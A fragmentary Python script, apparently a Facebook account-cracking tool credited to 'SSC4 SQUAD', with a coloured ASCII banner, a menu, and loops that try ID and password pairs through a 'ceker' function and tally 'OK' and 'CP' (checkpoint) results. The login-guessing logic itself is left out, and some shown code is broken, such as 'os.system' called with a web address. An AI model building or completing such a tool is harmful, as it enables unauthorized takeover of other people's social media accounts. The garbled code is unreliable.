...
╚═════╝░╚═╝░░╚═╝╚═════╝░╚═╝░░╚═╝╚═╝░░╚══╝╚═╝░░╚═╝
 \x1b[92;1m===================================>\x1b[92;1m 
 \x1b[93;1m Authur       \x1b[92;1m=>         \x1b[93;1m SSC4 SQUAD
 \x1b[93;1m FACEBOOK       \x1b[92;1m=>        \x1b[93;1m Sasank Xhetri
 \x1b[93;1m Github       \x1b[92;1m=>         \x1b[93;1m ⚠️ERROR⚠️
 \x1b[92;1m===================================>\x1b[92;1m 
 """%(h)) 
                  
 def menu(): #Bilo 
 ...
                 exit() 
         else: 
                 os.system("https://www.facebook.com/SASANK04") 
                 exit() 
 ...
         fff = '%' 
         print('\r%s [SASANK] %s/%s  OK*%s | CP*%s => %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush() 
 ...
                                         ceker(idf,pw) 
                                 else: 
                                         print('\r%s [SASANK-CP] %s|%s        '%(b,idf,pw)) 
